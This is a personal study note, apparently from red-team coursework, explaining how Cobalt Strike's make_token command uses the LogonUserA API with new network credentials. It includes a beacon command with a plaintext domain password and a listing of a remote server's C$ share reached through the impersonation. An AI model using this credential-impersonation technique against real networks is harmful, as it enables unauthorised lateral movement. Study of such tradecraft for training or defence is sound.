---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Make Token]]  
___

## Description:  
The `make_token` command in Cobalt Strike uses the [LogonUserA](https://docs.microsoft.com/en-gb/windows/win32/api/winbase/nf-winbase-logonusera) API which takes the username, domain and plaintext password for a user, as well as a logon type.

 `make_token` passes the **LOGON32_LOGON_NEW_CREDENTIALS** type, which has the same local identifier but uses different credentials for other network connections.

```
beacon> make_token DEV\jking Purpl3Drag0n
[+] Impersonated DEV\bfarmer
```

From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says **Impersonated DEV\bfarmer** - it's impersonating our own cloned token. And if we do a `getuid`, it will also still say we are **DEV\bfarmer** because the logon type "has the same local identifier". The magic is in "uses different credentials for other network connections" - if we now try to list the **C$** share on a remote server we now have access.

```
beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/23/2021 17:08:43   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/17/2021 18:28:36   System Volume Information
          dir     02/17/2021 18:32:08   Users
          dir     02/17/2021 18:28:54   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     03/04/2021 10:12:52   pagefile.sys
```

To dispose of the impersonated token, use `rev2self`.
___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (05:13 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
